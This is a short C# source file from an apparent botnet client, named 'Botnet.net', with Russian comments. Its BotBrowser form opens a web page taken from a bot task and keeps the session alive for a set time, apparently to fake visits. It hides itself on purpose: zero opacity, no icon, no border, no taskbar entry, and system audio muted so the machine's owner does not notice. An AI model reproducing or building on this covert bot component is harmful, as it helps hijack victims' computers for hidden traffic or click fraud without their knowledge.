using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace Botnet.net
{
    public partial class BotBrowser : Form
    {

        [DllImport("winmm.dll")]
        public static extern int waveOutSetVolume(IntPtr h, uint dwVolume);

        bool _PageIsLoad = false;
        TimeSpan _time;
        public BotBrowser(BotLib.Task task)
        {
            InitializeComponent();

            //Скрываем форму
            this.Opacity = 0.0;
            this.ShowIcon = false;
            this.FormBorderStyle = FormBorderStyle.None;
            this.ShowInTaskbar = false;
            waveOutSetVolume(IntPtr.Zero, 0);

            this.Browser.Url = task.Uri;

            this._time = task.Time;

            this.Browser.DocumentCompleted += new
                 WebBrowserDocumentCompletedEventHandler(
                (sender, e) => 
                this._PageIsLoad = true);//когда документ загрузится поле _PageIsLoad примит истенное значение и запустит счётчик.

        }

        public void SleepToSession()// используется для задержки пока ссесия не закончится
        {
            while (!this._PageIsLoad) ;
            Thread.Sleep(_time);
        }
    }
}
